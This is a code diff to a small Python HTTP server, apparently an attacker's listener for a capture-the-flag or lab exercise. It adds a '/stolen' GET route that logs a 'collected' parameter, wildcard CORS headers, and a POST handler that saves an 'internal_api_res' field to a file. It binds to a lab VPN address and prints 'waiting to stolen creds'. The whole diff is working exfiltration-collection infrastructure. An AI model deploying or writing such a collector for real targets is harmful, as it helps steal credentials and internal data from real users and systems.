@@ -2,6 +2,41 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import json
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    def set_cors_headers(self):
+        """Set CORS headers to disable restrictions."""
+        self.send_header('Access-Control-Allow-Origin', '*')  # Allow all origins
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')  # Allow common methods
+        self.send_header('Access-Control-Allow-Headers', '*')  # Allow all headers
+
+    def do_OPTIONS(self):
+        """Handle the OPTIONS method (CORS preflight)."""
+        self.send_response(200)
+        self.set_cors_headers()
+        self.end_headers()
+        
+    def do_GET(self):
+        from urllib.parse import urlparse, parse_qs
+
+        """Handle the GET request."""
+        parsed_path = urlparse(self.path)  # Parse the URL
+        if parsed_path.path == "/stolen":  # Check if the route is "/stolen"
+            query_params = parse_qs(parsed_path.query)  # Parse query parameters
+            collected_data = query_params.get("collected", [""])[0]  # Get the 'collected' parameter value
+            
+            # Log the collected data
+            print("Received collected data:")
+            print(collected_data)
+
+            # Respond with a success message
+            self.send_response(200)
+            self.set_cors_headers()
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(b'{"status": "data received"}')
+        else:
+            # Handle other GET requests with a 404
+            self.send_response(404)
+            self.end_headers()
     def do_POST(self):
         # Get the content length from headers
         content_length = int(self.headers['Content-Length'])
@@ -13,7 +48,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             json_data = json.loads(post_data)
             print("Received JSON data:")
             print(json.dumps(json_data, indent=4))  # Pretty-print the JSON data
-
+            
+            with open('server_status.html', 'wb') as f:
+                f.write(json_data["internal_api_res"].encode()) 
             # Send a 200 OK response
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
@@ -25,13 +62,11 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_response(400)
             self.end_headers()
 
-    def log_message(self, format, *args):
-        # Suppress logging to avoid clutter
-        return
+    
 
 if __name__ == '__main__':
     # Define the server address and port
-    server_address = ('', 2222)  
+    server_address = ('10.10.14.188', 2222)  
     httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
     print("Server running on port 2222 and waiting to stolen creds...")
     httpd.serve_forever()
